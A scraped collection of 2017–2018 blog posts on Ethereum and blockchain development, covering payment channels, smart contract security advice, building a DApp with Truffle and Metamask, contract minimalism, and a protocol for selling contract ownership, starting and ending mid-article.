state channels and side chains. Let\u2019s say Alice wants to send Bob 1 Bitcoin but speed and transaction costs are important to them so they want to run this transaction off chain.They open up a communication line between them called a \u201cpayment channel\u201d. 1) Alice sends Bob the 1 Bitcoin. Turns out, Alice only owed Bob 0.5 Bitcoin so 2) Bob sends Alice back 0.5 Bitcoin. Then Bob takes Alice on a weekend getaway. Alice picks up the tab so 3) Bob reimburses Alice another 0.1 Bitcoin.Instead of recording these 3 separate transactions on the main chain, we just record the final state of the payment channel to the main chain.Another key idea of the payment channel is that Alice and Bob don\u2019t need to open up a channel directly between them every time they want to transact.Alice can access Bob transitively through Pete, who has a payment channel opened with both Alice and Bob.You can imagine in theory, the idea of payment channels really becomes powerful when you have a rich network of participants. Every node can access every other node without being directly connected to them. The system is able to determine the quickest path between two nodes who want to connect.Photo Credit: http://forklog.net/bitcoin-lightning-meetup-in-kyiv-what-will-happen-to-bitcoin-after-lightning-network/There are many critics of payment channels. Finding the quickest path between unconnected nodes is no trivial exercise. This is a classic \u201ctraveling salesman\u201d problem that has been worked on by top computer scientists for decades. Critics argue that it is highly unlikely payment channels like Bitcoin\u2019s Lightning and Ethereum\u2019s Raiden will work as expected in practice due to complexities like the traveling salesman problem. The key for you is just to know that these projects and potential solutions to blockchain scalability issues exist. Many of the smartest minds in the industry are working actively to bring them to life.Summing UpCongratulations! You\u2019ve just educated yourself on the most common advanced topics in blockchain that you\u2019ll hear about. By understanding these concepts, you have a firmer grasp on the fundamental tradeoffs and latest research on the blockchain than most industry \u201cexperts\u201d! Better yet, next time you hear your colleagues around the water cooler talking about state channels, the Lightning Network and Byzantine fault tolerance, not only will you know what they\u2019re talking about but you might be able to teach them a thing or two!In this article, we took a different approach from our regular coding tutorials. We felt it was important for you to conceptually understand these advanced topics in blockchain development. We\u2018ll return to our coding style of tutorials in the next set of posts.Let us know which of these advanced concepts you want to see a coding tutorial for! The best place to tell us is in our Telegram chat. Join us now! If you disagree with anything in this post, let us know how wrong we are in the chat\u00a0:-)Be sure to check out our other tutorials!Code your own blockchainNetworkingProof of WorkProof of StakeIPFSP2PHyperledgerBuild a DApp on HyperledgerTo learn more about Coral Health and how we\u2019re using the blockchain to advance personalized medicine research, visit our website and follow us on Twitter!", "responses": "10"}, {"title": "Certified Ethereum Developer: Building Smart Contracts", "author_name": "Shaan Ray", "link": "https://hackernoon.com/certified-ethereum-developer-building-smart-contracts-3d71a49ad45c?source=search_post", "post_date": "Dec 22, 2017", "readtime": "5 min read", "upvotes": "379", "content": "Certified Ethereum Developer: Building Smart ContractsShaan RayBlockedUnblockFollowFollowingDec 22, 2017Ethereum is a public blockchain that supports distributed computing and provides smart contract capabilities on its EVM (Ethereum Virtual Machine). Smart contracts will transform several major industries in the coming years. At first glance, the concept of a smart contract seems simple and basic. However, the range and versatility of operations smart contracts offer is incredible.I recently attended the Certified Ethereum Developer (CED) program at York University\u2019s Blockchain Hub in Toronto. This certification program is the first of its kind. It focuses on Solidity, a programming language that runs on the Ethereum blockchain. By the end of the three-day intensive program, the other attendees and I, were able to code our own smart contracts and create tokens. The course also covered topics including ICOs, DAOs, smart property, and other emerging blockchain concepts. The program ends with an exam and a Capstone Project.I teamed up with Ben Brown and Mo Hasan to build smart contracts focused on smart city and government services. Our Capstone Project was a hypothetical municipality that ran its tax collection and municipal services through a series of smart contracts. Even though we completed and submitted the project, we continue to tweak it and add more features.Though I have been in the blockchain space for years, it was exciting to learn and revisit several new topics during CED. Some of these are below:ModularityEthereum is modular and very flexible. A user can tweak the protocol and change several components of it to suit specific organizational needs. Two important such components are:1. Difficulty level\u200a\u2014\u200ahow difficult do you want to make mining on your network? How much hashing power will it take to solve a block?2. Consensus mechanism\u200a\u2014\u200awhich consensus mechanism do you want your protocol to follow\u200a\u2014\u200aproof of work, proof of stake, or proof of authority?A solidity contract I wrote on the Ethereum\u2019s Remix IDE. This contract performs a simple addition of two numbers. The contract would be triggered externally by someone calling this contract and sending two numbers to be added. On the bottom right of the screen by the addNumber tab I have sent \u20185\u2019 and \u20182\u2019, the result \u20187\u2019 is display next to the getResult tab.Building a blockchainWe worked with GETH and created an internal blockchain for CED attendees. The experience of creating a blockchain from scratch, maintaining it, and participating in transactions on it, was immensely rewarding. It allowed attendees to put their conceptual knowledge into practice. It helped crystallize the following concepts, among others:1. Genesis block\u200a\u2014\u200ain the process of creating our genesis block, we assigned values to several variables, including the volume of currency allowed in this particular blockchain, and how much each user was assigned.2. Timestamp\u200a\u2014\u200aeach block is timestamped with the time at which it was created. Interestingly, Ethereum follows Unix time, which means that it considers the beginning of time to be 00:00:00 UTC Thursday, 1, January 1970 (also known as POSIX time or epoch time).3. Mining\u200a\u2014\u200awe used the commands \u2018> mining.start\u2019 or \u2018> mining.stop\u2019 to start or end mining sessions on our cryptocurrency.4. Transacting\u200a\u2014\u200awe then used the coins we had mined to transact with one another within our network, and also paid fees in the form of \u2018gas\u2019 to enter data into each block.5. Communicating\u200a\u2014\u200aalong with sending cryptocurrencies, we were also able to send messages in \u2018string\u2019 form as part of the transaction data. Messages can be sent to inform another peer of various attributes, such as your Status, your current Ethereum State, and node data.Denominations of\u00a0Ether.Smart ContractsSmart contracts are agreements that are written in code and that are self-executing. They permit transactions to be conducted in a distributed, safe, and transparent environment. (The smart contract concept was first proposed by Nick Szabo in 1994\u200a\u2014\u200athis may be why \u2018szabo\u2019 is a denomination of ether: 1,000,000 szabo = 1 ether.) Some important smart contract concepts include:1. Gas\u200a\u2014\u200athis powers each smart contract. Ether can be converted into gas. The gas exists on the Ethereum Virtual Machine. It cannot be traded on other exchanges. The price of gas is not pegged to ETH. Rather, it varies according to a complex algorithm. Executing a transaction or smart contract uses gas. The amount of gas required is proportional to the complexity of the contract.2. Contracts can call on other contracts\u200a\u2014\u200athey can call functions of other contracts, and can be programmed to create and deploy other contracts using ether and gas.3. Inheritance\u200a\u2014\u200aa contract can be programmed to inherit code from one or more other contracts.4. Calling a contract\u200a\u2014\u200acreating and putting a contract on a block is a necessary but separate step from triggering that contract by calling it. The entity calling a contract is known as \u2018msg.sender\u2019, while the entity at the beginning of a call chain is called \u2018tx.origin\u2019. For example, in call chain A > B > C >D > E, \u2018msg.sender\u2019 could be E while \u2018tx.origin\u2019 is A. (n this scenario, A called on smart contract B; B (according to what the contract demanded) called on C, and so on. The immediately previous actor is denoted by \u2018msg.sender\u2019 while the original entity at the very beginning of this chain is called \u2018tx.origin\u2019.Crypto enthusiasts gearing up for the holiday season. Photo credit Hodlmoon.comOverall ImpressionThe instructors who taught this course were experts in their fields and had a broad range of experience in blockchain technology, distributed ledger applications, payment systems, cryptography and entrepreneurship. I found my colleague Aalim Khan to be a gifted programmer who is highly skilled in Solidity and creating smart contracts.While this post highlights some of my thoughts, it only scratches the surface of what the program covers. For brevity\u2019s sake, I omitted several important conceptual (such as creating our own ERC20 tokens) and social (such as making friends among attendees, instructors, and others in the blockchain community) aspects of the program. While coding skills are a definite plus, a basic understanding of programming is enough to learn a ton from this course.", "responses": "3"}, {"title": "Ethereum Development Walkthrough (Part 3: Security, limitations, and considerations)", "author_name": "dev_zl", "link": "https://hackernoon.com/ethereum-development-walkthrough-part-3-security-limitations-and-considerations-d482f05278b4?source=search_post", "post_date": "Jan 21, 2018", "readtime": "9 min read", "upvotes": "544", "content": "Ethereum Development Walkthrough (Part 3: Security, limitations, and considerations)dev_zlBlockedUnblockFollowFollowingJan 21, 2018The year is 2023, Dave is an administrator who will soon lose his job because a SaaS Dapp is basically doing it now, and everyone\u2019s in his floor. Still, as an honest worker, he is going to do his job well till the last day. Dave was asked by email to send a sum of ether, and an address to a smart contract\u2019s function.So our guy opens up his Ethereum wallet a.k.a. a word document. He fires myWallets.docx, and finds 4 entries: My secret key, the company\u2019s secret key, my password, the company\u2019s password.He opens Mist, finds the Smart Contract he needs to send ether to, input 1000 ether from the company\u2019s account to the function of the Smart Contract, go back to his emails, and copy the address he must send to the function. But, mistakenly, he doesn\u2019t copy the whole address. He notices his mistake, and complete the address manually, but mistype the last character. Now, it\u2019s a whole new address.Dave presses the send button, copy-past the company\u2019s password, confirm the transaction and the function is executed. Upon executing, that said function send ether to some predefined account addresses, and the rest of ether to the address that Dave typed in, through a self-destructing call, because the developer who wrote it thought it was a good idea to clean out the blockchain from a smart contract that is now useless (Spoiler: You can\u2019t) after the execution of that function.Coincidentally, the mistyped address is the address of a Wrestling contract from the first part of this tutorial, that someone created mistakenly on the mainnet following the second method of the second part of the tutorial.Also, in the same timeline, someone found that Wrestling contract, registered as a second wrestler, put ether in using the Wrestle() function, but the first Wrestler never played his round, and the second wrestler\u2019s ether is forever locked in that Wrestling contract.So in this really improbable scenario(or is it?), ether was lost due to human error, and an incomplete contract.About the Wrestling contractAlthough we implemented the base of our game, we didn\u2019t thought about the life-cycle of the contract. When it\u2019s created, when it\u2019s used, when it isn\u2019t anymore.What if a wrestler never plays after a few rounds? We should give the players the ability to withdraw their money after a certain time, if one of them never plays their round.We also need to think about when a contract will not be used anymore (In our case the end of the wrestling). I said that, in order for a contract to receive ether, we should add the \u201cpayable\u201d keyword to the function that will receive it. But a contract can still receive ether through two methods (and there is nothing you can do to refuse it), when a contract self-destruct(a special, pre-defined function within Solidity that will disable the contract and send all the ether it has to a designed address) to the address of another contract, or when ether is mined to that contract. So, you should always keep a way to take ether from a contract if it ever has more than it should.In our case, since the winner will get all the ether off the contract anyway, we could let him do using an alternative withdraw function, like the following one:It will let him withdraw whatever ether is on the contract, as many times as he wants.When sending money in general, keep in mind that, for some reason, the process could fail, and you should prefer to let the contract\u2019s users withdraw their money than send them directly (like we did with the Wrestling contract).Also, you would think that it\u2019s a good idea, for a contract to self-destruct itself, so you can clean the blockchain, but a contract that was destroyed will remain on the blockchain, and could always receive ether as outlined above.You should also think about a \u201cplan b\u201d, if for some reason, your contract doesn\u2019t behave as expected during production. Because you can\u2019t modify a smart contract once it\u2019s deployed, you may want to keep a sort of lock you can trigger, and it can either pause the transactions of the contract, or send the value it holds to another contract that\u2019ll let the users of the contract withdraw their ether for example. That trigger diminish the decentralization of the contract by giving power to a third party, so it will depend on the use case of your contract, to whether or not use such a system.SecuritySecurity on Solidity starts by following common development patterns, staying up to date with the development of the platform, making your contract bugs free(or at least trying to) through tests, knowing the limitations of the platform, keeping your contract code as simple as possible, and keeping in mind that Ethereum itself(The software behind the blockchain, Solidity compiler etc.) has bugs, and is changing everyday.TestsTests are an important part of any serious development, and if your old methods included waiting for the bugs to show up before fixing them, you are going to have a hard time adapting.Truffle, that we saw in the last part, let us test our contracts in an easy way.Open the project of the last part, fire a couple command-line interfaces, and launch ganache-cli.ganache-cli -p 7545Create a new folder named \u201ctest\u201d, and create a file named \u201cTestExample.js\u201d inside.Paste the following content in it:What it does is, retrieve the Wrestling contract, deploy it to our test network, and try to use the withdraw function. Because no one should be able to use the withdraw function before the game ends, it should return an error because of the \u201crequire\u201d instruction we used inside the withdraw function in our contract.Execute the test on the development console:truffle test --network developmentYou should have a similar output to this:Because executing contract functions is an asynchronous process, you would prefer to use async/await for a cleaner test code. But for the sake of simplicity, our example does the job.An exercise for you would be to simulate a wrestling game, and make sure only the winner can withdraw the ether off the contract at the end (pretty much like we did with the truffle console in the last part).You can see another example of testing in this tutorial. And, don\u2019t hesitate to check Truffle\u2019s documentation.Alternatively, there are some security tools made by the community that can help you when you audit your code. They are listed here.Business logicTesting the functions inside the contract is good, but you should always step backward, and see the interaction between the functions inside your contract, and if you contract, as a whole, is doing what it should do (And nothing else).Keeping your smart contract well-commented is the first step toward a clear, and well-written piece of code (note that the Wrestling.sol contract we saw in the first part is not). The second step would be to keep your contract as simple as possible, and only write in the smart contract the part of your application that needs to be decentralized. If your smart contract will be part of a Dapp (in simple words, a dapp is a web application that have a part of it decentralized* (i.e: A part of it is a smart contract, or it interacts with smart contracts)), make the difference between what needs to be on the blockchain, and what can be handled by the UI, or the backend of the web app.Note*: The definition of a dapp is broader than that, and includes all applications that leverage peer-to-peer interactions. Mist, Bittorrent, Tor etc. are all application that can be called decentralized. See this article by Vitalik Buterin.Know the\u00a0platformTo really know what you are doing, you should read the docs, there is no way around it, and complete your knowledge by searching on aspects of Solidity development that are not covered in the docs.For example, you should know that fixed-point variable (a.k.a. floats or double) are not fully implemented yet, and a division using the the type \u201cuint\u201d, like 7 / 3, will round down to the nearest integer, in this case 2. So you should not take for granted some things on a platform that is still under heavy development.Because the blockchain is public, everyone could know the information that your variables hold, and you could only try to obfuscate the information within, and not conceal it completely. Same thing for generating a random number or string, anyone who knows how you\u2019ll try to generate the number could potentially craft it. There are actually people trying to figure out the best method to generate random numbers, and you may want to join the fight if that interests you. As I said before, everything is still under development, and there is no industry standards for a lot of things.Time dependent contracts are also a hot point, if your contract would need to run at certain times, you would need to rely on an external application (and keep in mind that it can go down or cease to function at a certain time), because a smart contract cannot trigger itself. If your contract rely on time to judge on certain points, remember that malicious miners could temper with the time a transaction will be executed.Know also that your contract is public, everyone can read it, everyone can interact with it, and if your contract interact or make external calls to other contracts, you have to keep in mind that a malicious contract could temper with the execution of yours.All of this become a bit James Bondy, but when there is a lot of money at stake, people get creative. If your smart contract is running behind a store that sells diapers for old people, you probably wouldn\u2019t need to care that much.Limitations of the\u00a0platformKnow that the Ethereum platform is not meant for heavy computations, and your transactions are limited by gas. You should keep the logic as simple as possible, and beware of infinite loops, storage limits, value overflow, and all of these little details. Because you can\u2019t remove or modify a contract once it\u2019s on the blockchain, you should consider all these aspects before deploying it.The compiler, and the software behind the Ethereum blockchain are still under development, and undergo continual change, so you should keep that in mind, and stay up to date.Third partiesThere a lot of good actors trying to make the users and developers life easier, and let them access the Ethereum main blockchain without the need to download it locally. Such as MEW, that let you transfer ether and deploy smart contracts, or INFURA that let you access Ethereum blockchain through an API, which is, coupled with truffle, is a solid tool.While there is no doubt about the good intentions of these services, and the skills of the developers behind them, it\u2019s up to you to whether or not seek convenience over security. Platforms like that are always the target of hackers because of the number of transactions they handle, so they will be always a bigger target than a node you set on your machine. At the end, your choice will depend largely on how much money you are moving around and juggling with.Some directions, and where to\u00a0startBefore leaving you, here are some great materials where you can start your research:A great alternative introduction, in video, would be this one from @KonstantHacker.Common patterns on Solidity docs.Security consid\u00e9rantions on Solidity docs.A more exhaustive document regrouping more recommendations.One thing to keep in mind is, no document can be complete when it comes to security, so you have to research on your own, and use well-thought out and good programming practices.And most of all, start participating, there a lot of project that would need more eyes to find bugs in their code, and there a lot of bounties to grab.And if you find a bug, or discover a better way to do something, don\u2019t hesitate to share your knowledge. Ethereum and the blockchain world follow the open source principles, so the whole community benefit from whatever is discovered or made.The code for this part is available on Github.devzl/ethereum-walkthrough-3ethereum-walkthrough-3 - Repository for the third part of the tutorial series on Ethereum, \"Ethereum development\u2026github.comConclusionAs a conclusion, you really need to get that mindset of a smart contracts developer, and prepare to do a lot of research and tests before launching your contracts into the wild.And as professor Moody says:If you liked this third part, you can find me @dev_zl.In the next part we will see tokens.", "responses": "3"}, {"title": "Ethereum Development Walkthrough (Part 5: Making a\u00a0DApp)", "author_name": "dev_zl", "link": "https://hackernoon.com/ethereum-development-walkthrough-part-5-making-a-dapp-4c2a3bbcd5e5?source=search_post", "post_date": "Feb 21, 2018", "readtime": "7 min read", "upvotes": "524", "content": "Ethereum Development Walkthrough (Part 5: Making a\u00a0DApp)dev_zlBlockedUnblockFollowFollowingFeb 21, 2018If you have read every part of this tutorial series, you already know how to make a decentralized application on Ethereum, and in this tutorial, I\u2019ll just guide you to use that knowledge together.On Ethereum, a DApp is a web application that will interact with smart contracts deployed on the blockchain. You can do it using python or other programming languages, but these will not be covered in this tutorial. We will focus only on JavaScript.We saw how to make a smart contract, in the first part, and how to deploy it in the second. And in this tutorial, I assumed that you have a JavaScript background, it doesn\u2019t matter how advanced you are, or which frameworks you use, we will use vanilla JavaScript, and a bit of JQuery to make our life easier.One thing that we will need, is, a tool that let us interact with the deployed smart contract, for that, we have a great API named Web3.js.We have seen Web3.js, both on the Truffle console in part 2, and when we performed a test on our contract in part 3.Let\u2019s startCreate a new folder for the project, and run the truffle init command.Next, create a folder named \u201csrc\u201d where we will store our web application files. Inside the folder \u201csrc\u201d, create an \u201cindex.html\u201d file. Paste the following code inside:Create a folder named \u201cJShelpers\u201d, and create the following three files inside:touch jquery.min.js touch truffle-contract.js touch web3.min.jsYou can find their content in the source code for this tutorial on Github.Now, back to the \u201csrc\u201d folder, create a new file named \u201capp.js\u201d. \u201capp.js\u201d will hold our JS logic, we will use a bit of JQuery with vanilla JavaScript to keep it simple, but of course in a real DApp, you can use the frameworks you like, for example React, Angular, Vue etc.Now, open \u201capp.js\u201d, and add the following code:We start by creating some necessary variables, and initializing our Web3 provider variable. We will expect the users to have a web3 provider running. Most users at the moment use Chrome or Firefox, with an extension called \u201cMetamask\u201d to interact with an Ethereum blockchain, so we are expecting Metamask to inject an instance of web3 in the page, if not, we ask the users to install it.Now, let\u2019s implement the necessary functions to interact with our contract, we will start by initializing a reference to the deployed smart contract, creating the function \u2018initWrestlingContract ()\u2019:Then we will create the body of the other functions that will retrieve the informations for us:The \u2018init()\u2019 that launches the execution of all these functions will of course not be executed automatically, so we need to trigger it:Now we will need to complete our html page, modify it so it will look like this:Back to our \u201capp.js\u201d script, we need to add \u2018registerAsSecondWrestler\u2019, the function that will let a user register as a second wrestler\u00a0:That\u2019s it for our web app! We just need to configure a few things and we are set to go.InstallationsWhile an html document could be opened directly on your browser, the Metamask extension wouldn\u2019t be able to interact with it due to your browser security measure, so we will use a little local http server to serve our files. For that, we will use lite-server:npm init -ynpm install lite-server --save-devCreate file a config file for lite-server named \u2018bs-config.json\u2019 in your project root folder, and paste the following inside:This instructs lite-server to take files from the folder \u201csrc\u201d, where our web app is, and \u201c./build/contracts\u201d where the json files that describe the smart contracts deployed by truffle.Next, add this line:\"dev\": \"lite-server\",To \u2018package.json\u2019 inside the \u201cscripts\u201d node like the following:...  \"scripts\": {    \"dev\": \"lite-server\",    \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\"  },...Then run the following command inside your console, it should open a page on your browser at \u201chttp://localhost:3000/\u201d:npm run devNow, search for and install Metamask on your browser.The smart\u00a0contractDon\u2019t forget to deploy a smart contract to your test network. You can find the Wrestling contract in part 1 of this tutorial, and use one of the methods shown in the second part of this tutorial series.For this part, I\u2019ll use Ganache, the UI version, but you can use ganache-cli to simulate the ethereum blockchain.To deploy the smart contract, use truffle migration command:truffle migrate --network developmentDon\u2019t forget to check that your \u201ctruffle-config.js\u201d file is set correctly. And that you added the migration script necessary to deploy it.Configuring MetamaskAfter installing Metamask, click on its icon, then click on the top left of the pop-up, you\u2019ll see a list of different networks, choose the \u201chttp://127.0.0.1:7545\u201d one. If there is no such option, click on the \u201cCustom RPC\u201d option, and add that url, so Metamask can connect with Ganache.Now click on the \u201crestore from seed phrase\u201d option shown in the pop up of Metamask, add copy-past the 12 words of the mnemonic on ganache, and write a password you like.This process will unlock the first account, the one with which we deployed the contract, but for a good simulation, we will use the second account that Ganache generated, so we will have to add it manually to Metamask, click on the user icon on the top right of Metamask, and choose \u201cimport account\u201d, paste the private key that you can copy from the ganache-cli, or click on the key icon on Ganache if you are using the GUI version.Testing the\u00a0DAppNow that the smart contract is deployed on our test network, that we have our web app set up, and that Metamask is configured, we can test the DApp.Start by going to http://localhost:3000/, the link where lite-server is serving our web app, you\u2019ll see the interface of the web app:The amazing and cutting-edge UI of our\u00a0DAppMaking sure that the Account 2 is still selected on Metamask, press the \u201cRegister to fight\u201d button, and normally a pop up from Metamask will appear, asking you to confirm the transaction (You can see it also by clicking on the icon of Metamask if it doesn\u2019t pop up).Upon clicking on the submit button, the address of the second wrestler should be replaced by the address of the account that triggered the call (If it doesn\u2019t automatically, refresh the page. If it seems that the transaction fails, check that you followed this tutorial correctly, or that Metamask doesn\u2019t bug, because it did for me when I was writing this tutorial. Most tools around Ethereum are still under development, and we can only thank the developers behind them for the huge effort they put on them).That\u2019s really what a DApp on Ethereum is, there is nothing more to it. For the ones who want to interact with a smart contract in the backend of their DApp, you can of course use Web3.js on NodeJS by installing it with NPM, and using Geth, or infura.io as the provider. Here is a good tutorial that will walk you through that process.Here is the link for the source code for this tutorial:devzl/ethereum-walkthrough-5ethereum-walkthrough-5 - Repository for the 5th part of the tutorial series on Ethereum, \"Ethereum development\u2026github.comHere are an alternative tutorial if you had a hard time following this one. And an other one over here.Going forwardNow, you have all the cards in hands to develop your Ethereum contracts and DApps, read other tutorials on the points that you didn\u2019t understand well, read the documentations of the tools we saw in this project, and of course, practice, a good exercise for you will be to complete the web app of this tutorial, by adding the others functions of the smart contract.You could join the developer community over Reddit, good tidbits are posted there regularly. You can read weekly news of what\u2019s going on in the Ethereum world on the WeekInEthereum website. The ethereum forums are interesting too, and there are pretty active chats on the gitter of Ethereum.This tutorial series ends here, but I\u2019m already pen and paper, preparing another tutorial. Don\u2019t hesitate to follow me so you\u2019ll be notified when it\u2019s out!You can also find me on twitter @dev_zl.", "responses": "9"}, {"title": "The Joy of Minimalism in Smart Contract\u00a0Design", "author_name": "Rob Hitchens", "link": "https://medium.com/solidified/the-joy-of-minimalism-in-smart-contract-design-b67fb4073422?source=search_post", "post_date": "Apr 11, 2018", "readtime": "3 min read", "upvotes": "433", "content": "The Joy of Minimalism in Smart Contract\u00a0DesignRob HitchensBlockedUnblockFollowFollowingApr 11, 2018We all know blockchains and smart contracts provide unmatched assurances about unstoppable logic and immutable data. As attractive as that sounds, it\u2019s best to use it as sparingly as possible. A well-crafted, minimalist contract only addresses concerns that cannot be addressed any other way.\u201cIf a concern can possibly be addressed outside of a smart contract, then that\u2019s what we should do.\u201dThat may seem strange coming from someone who specializes in helping others maximize utility of smart contracts and blockchains. It\u2019s not a contradiction. Blockchains and smart contracts are an extraordinary solution. It\u2019s best to reserve it for extraordinary problems. Use it to create trust and resolve uncertainty\u200a\u2014\u200anothing routine.For example, if you merely want to award points, countless examples existed long before blockchain. On the other hand, if you want to prove that those points are always and will always be awarded by a disclosed formula, then you may need to make the formula an observable fact on the blockchain. That would be solving for trust in the meaning of the scores.This interpretation implies a narrow scope of concerns a smart contract should address. Contracts;define the essential, enduring facts about the application,provide the authoritative record of the facts that all participants can refer to in order to know they have the correct information, andprovide evidence of application integrity via immutable processes that prevent corruption in any form.With those concerns attended to, it\u2019s usually a good idea to make the complete state conveniently discoverable and completely auditable. Beyond these core concerns are details that can be attended to by clients.Consider the idea of sorting the data in the contract or finding a way to search it and filter it efficiently. It might be very useful, perhaps even critical to the overall solution. Even so, high importance doesn\u2019t imply that the implementation belongs at the smart contract level.Given that:the data in the contract is completely discoverable,state changes emit events in real time (they should), andclients can inspect the state, listen to events, or both,software clients can employ a range of strategies to discover the facts they need in any given moment. Minimalist contract design provides the toolbox for constructing an appropriate client-side implementation without attempting to do the software client\u2019s job. Indeed, the author would argue that client-side convenience shouldn\u2019t influence contract design.Whether it\u2019s a browser app or a massive cluster of caching servers, the contract\u2019s posture toward the outside world is the same.The state is completely discoverable.State changes are (should be) broadcast by event emitters.Any off-chain caching strategy is acceptable but the contract\u2019s version of the facts is always authoritative.Any off-chain query solution is acceptable.Any service that purports to perform these services can (and should) provide clients with all the necessary details clients would need to check the blockchain for themselves, if they want to.Knowing that a wide range of valid concerns will be attended to by off-chain processes greatly reduces the scope of functions that need to be coded inside a contract. A minimalist contract addresses only concerns that can\u2019t be addressed any other way.Minimalism leads to clarity about exactly what the contract needs to prove and the minimum logic and data required to construct the proof. Minimalism is the first defense against defects that might have non-trivial consequences. The ideal is something so simple that there are obviously no defects.\u201cObviously no defects\u201d is easier said than done, which is why an Audit and a Bug Bounty is an absolute must before any piece of software should be entrusted with significant value.When you\u2019re going for perfection, simple is better.", "responses": "1"}, {"title": "The Ultimate Guide to Test Your Smart\u00a0Contract", "author_name": "Merunas Grincalaitis", "link": "https://medium.com/ethereum-developers/the-ultimate-guide-to-test-your-smart-contract-ddc65fbb5ba5?source=search_post", "post_date": "May 9, 2018", "readtime": "10 min read", "upvotes": "600", "content": "The Ultimate Guide to Test Your Smart\u00a0ContractMerunas GrincalaitisBlockedUnblockFollowFollowingMay 9, 2018Testing is one of the most important\u200a\u2014\u200ayet overlooked\u200a\u2014\u200aaspect of the development of smart contract. Whenever you create a smart contract you have to make sure that it\u2019s working properly and testing is the best way for using the contract in different situations without any risk. In this guide, you\u2019ll learn the steps that you need to take to make sure your contracts are safe via testing.Here\u2019s all that you\u2019ll know after finishing this tutorial:How to set up a testing environment with truffleHow to write the tests in javascript and execute them in a test networkThe 5 things that you must test in any contractConclusionNote that you should have at least a medium level of javascript to write tests however you should be able to understand most of what\u2019s going on.", "responses": "6"}, {"title": "Problems & Costs of Smart Contract Development", "author_name": "Michiel Mulders", "link": "https://hackernoon.com/problems-costs-of-smart-contract-development-e86e9446ba9e?source=search_post", "post_date": "Mar 25, 2018", "readtime": "3 min read", "upvotes": "683", "content": "Problems & Costs of Smart Contract DevelopmentCan your business afford\u00a0it?Michiel MuldersBlockedUnblockFollowFollowingMar 25, 2018Image by Gratisography.comThe problem with smart contracts is that most small and medium businesses are unable to implement smart contracts not only due to technological complexity but mostly because of their expensiveness. The costs for smart contract development are skyrocketing as there is an increasing demand for smart contract developers and contracts for ICOs.Why smart contracts are so great in the first\u00a0place?Smart contracts, which are, actually, a self-executing code on blockchain that automatically implements the terms of an agreement between parties or business logic. It\u2019s basically an unbreakable agreement with predefined rules. In addition, smart contracts are deterministic which means the same output will be generated from a given initial state/input. Because of these properties, companies are keen to experiment with smart contracts to find opportunities for their business model. Being a first-mover gives a company many advantages like new clients, media attention, and more revenue.What\u2019s the actual cost of smart contract development?The development process itself is not only driving the costs. Proper auditing and testing are very expensive as this requires even more specialized niche knowledge to find bugs/faults in your smart contract code.A simple smart contract with no complex business logic costs around $7,000. More advanced contracts cost up to $45,000 and more. It\u2019s not uncommon large organizations with specialized knowledge ask up to $100,000. In addition, don\u2019t forget about the costs for deploying your contract on the main net. The complexity of your contract defines the price.It\u2019s even possible to calculate the exact gas price of your smart contract. If you do a quick google search for \u2018Gas Costs from Yellow Paper\u2019 you will find this spreadsheet. Each operation is listed in the spreadsheet with the gas price for executing it. For example, using the \u2018addition\u2019 operation costs you 3 gas (which is very low). If you have a more complex contract, it\u2019s not easy to calculate this. The Mist wallet, for example, is capable of making a rough estimation of the actual gas cost when deploying your contract.Spreadsheet Gas Costs\u00a0EthereumSolving the price\u00a0problemThe problem with smart contracts is that most small and medium businesses are unable to implement smart contracts not only due to technological complexity but mostly because of their expensiveness.iOlite is solving this problem using their Fast Adaptation Engine (FAE). Contributors, smart contract experts, can define structures linked to smart contract code. Through machine training, the FAE is capable of understanding more complex language, resulting in the creation of better smart contracts. Best of all, the FAE doesn\u2019t charge you any money for the development of a smart contract. On the other side, contributors are rewarded with iLT tokens through the mining process. The mining process occurs when a solution has been found for a specific input.If you want to know more about iOlite, check out their Medium or join them on Telegram.", "responses": "4"}, {"title": "A Protocol for Sellable Smart Contracts", "author_name": "Pablo Ruiz", "link": "https://medium.freecodecamp.org/a-protocol-for-sellable-smart-contracts-829bc2ce02b3?source=search_post", "post_date": "Dec 23, 2017", "readtime": "6 min read", "upvotes": "460", "content": "Photo by Jezael Melgoza on\u00a0UnsplashA Protocol for Sellable Smart ContractsPablo RuizBlockedUnblockFollowFollowingDec 23, 2017Ethereum doesn\u2019t have the concept of smart contract ownership built into it.Even though the creation and deployment of a smart contract is done by an account\u200a\u2014\u200abe it an External Owned Account (EOA) or another contract\u200a\u2014\u200abeing the creator of the smart contract doesn\u2019t give the account any special privileges over the contract they deployed.Most use cases for smart contracts require someone to own the contracts. This \u201cowner\u201d is given privileges\u200a\u2014\u200aand responsibilities\u200a\u2014\u200aover the smart contract.In a crowdsale contract they might be tasked with managing the whole process and pausing the crowdsale if something goes wrong.In a Lottery/Ruffle Dapp they might be tasked with executing the number draw.In any contract that holds funds, they might be set as the beneficiary upon construct destruction.Photo by Ricardo Resende on\u00a0UnsplashA common pattern used by many smart contracts is to set the owner to the account deploying the contract like so:pragma solidity 0.4.19;contract MyContract {  address owner;  function MyContract(){    owner = msg.sender;  }}Then, adding a modifier:modifier onlyOwner {  require(msg.sender == owner);  _;    }And finally, using that modifier to enforce that critical operations can only be performed by the owner of the contract:// Suicide the contract and transfer funds to the owner// Only available to the owner, for obvious reasons.function destroyContract() public onlyOwner {  selfdestruct(owner);}The Problem with Changing Contract OwnershipThere are some situations that would require ownership of a contract to be given to someone else. To name a few:The person that deployed the contract did it on behalf of someone elseA developer or consultant doing a contracting job for a companyA company wants to liquidate / sell its assets, which include smart contractsWhich might or not have ether balanceThe owner of the smart contract wants to give it away, donate it, or just flip it for profitPhoto by rawpixel.com on\u00a0UnsplashSome contracts, but unfortunately not many, include a function to give ownership of the contract to some other account. And some of them also include another function for that person to accept the ownership that has been bestowed upon him.function changeOwner(address _newOwner)public onlyOwner {  ownerCandidate = _newOwner;}function acceptOwnership()public {  require(msg.sender == ownerCandidate);    owner = ownerCandidate;}Now, the situations mentioned above share a few common issues that these not-so-widely-used changeOwner() and acceptOwnership() functions don\u2019t address:How can the buyer of the contract be certain that once they pay for the ownership of the contract, the seller will actually execute the corresponding changeOwner() function?This can happen the other way around. How can the seller of the contract be certain that they will get paid if they cede ownership first?How can the buyer of the contract be certain that the current owner of the contract will not modify it (well, it\u2019s data) before giving away its ownership?The Sellable Contract\u00a0ProtocolThe solution I propose is implementing a series of functions that would allow the owner of a smart contract to sell it in exchange of ether to someone of his choosing or just put it up for sale for anyone to buy at the asking price on a first-come first-save basis. This could be extended to allow different sale methods using different auction styles.The details of the protocol can be read\u200a\u2014\u200aand discussed\u200a\u2014\u200aon the corresponding EIP.In the following paragraphs I\u2019ll go through an implementation example, which is 